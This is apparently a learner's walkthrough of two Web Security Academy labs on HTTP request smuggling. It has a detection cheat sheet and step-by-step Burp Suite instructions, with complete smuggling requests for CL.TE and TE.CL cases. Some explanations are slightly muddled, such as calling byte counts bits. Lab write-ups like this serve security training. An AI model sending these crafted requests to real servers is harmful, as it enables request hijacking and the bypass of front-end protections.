Detecting 
      1: 
        Content-Length: 6                                          response (backend) >>>>CL.CL
        Transfer-Encoding: chunked
        \r\n                                                                          >>>>TE.CL
        3\r\n                                    >>>>              reject (frontend)
        abc\r\n                                                                       >>>>TE.TE
        X\r\n                                                      
                                                                   timeout (backend)  >>>>CL.TE


      2:
        Content-Length: 6                                                             >>>>CL.CL
        Transfer-Encoding: chunked                                 response (backend)
        \r\n                                                                          >>>>TE.TE
        3\r\n                                    >>>>              timeout (backend)  >>>>TE.CL
        abc\r\n
        X                                                          socket poison (backend) >>>>CL.TE


Task 1:
///Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses///

Open the site in burpsuite, and send the GET / request to repeater.
At the first repeated request (call it to "Attacking request") change the protocol to http 1, turn on show non-printable chars, and next to the send button there is a little option menü, uncheck the "update content length"
After this change the request methot to post, and delete everything between Host and Content-Type, like this:
POST / HTTP/1.1
Host: 0a9d008703d657ec81d0a2c800a500e5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

Add these lines:
Transfer-Encoding: chunked

3
abc
X (press enter after X!)

Change the content-length to 6 and send it...it will be a lot of time to get a response actuall it will timeout, which means the site has a CL.TE vulnerability.
Now modify our request like this:
POST / HTTP/1.1
Host: 0a9d008703d657ec81d0a2c800a500e5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 36

0

GET /asdf HTTP/1.1
X-Ignore: X (do NOT press enter after X)
And in options check back "update content length". 
Now modify the second repeated request (lets call it "Normal request" like change the protocol to http 1.
Now everyting is ready.
Send the Attacking request, and after that send the Normal request, and we solved the lab.

Task 2:
///Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses///

Open the site in burpsuite, send the GET / request to repeater. In repeater change the http protocol to 1, change the method to POST, uncheck the "update content length" and turn on show non-printable chars.
Delete the unneccessary lines, and type 1 plus line into the request:
POST / HTTP/1.1
Host: 0a6e000e04b99b248251b05f001900ba.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X (press enter after the X)

Send the request, and you will get a 400 bad request response so the front-end rejected the request which means it can be vulnerable to TE.CL or TE.TE,
So check down the backend server..Change the request like this:
POST / HTTP/1.1
Host: 0a6e000e04b99b248251b05f001900ba.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X (DO NOT press enter after the X!!!)
And send the request...and it timed out, which means its a TE.CL velnerability.

To solve the lab, change the request like:
POST / HTTP/1.1
Host: 0a6e000e04b99b248251b05f001900ba.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9f
POST /asd HTTP/1.1
Host: 0a6e000e04b99b248251b05f001900ba.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

x=1
0

So what is 9f, how i know the content lenght 15 etc...if you  select this 3 line:

x=1
0
In burpsuites window on the right side there is a little part called 'inspector'. If you select anything in the request it will show you something like this: 10(0xa).
So if you select this 3 lines you will see the number 10 (which means 10 bits), all you have to do is set the 2nd content-length to bigger then this number, so 10+ (11,12,13...etc, i picked 17)
What is that 9f. Select the characters from the beginning of the 2nd POST to the end of x=1 (without the \r\n). Check the inspector part again, to me, its 159(0x9f).
Whatever is after the x copy that there.
And the first content-length is this two line:

9f
To me its 4(0x4) which means its 4.
Before we run our attack, send the original GET / request again to the repeater, change the HTTP protocol to 1. Now send the modified request, then the normal request, and we solved the lab.





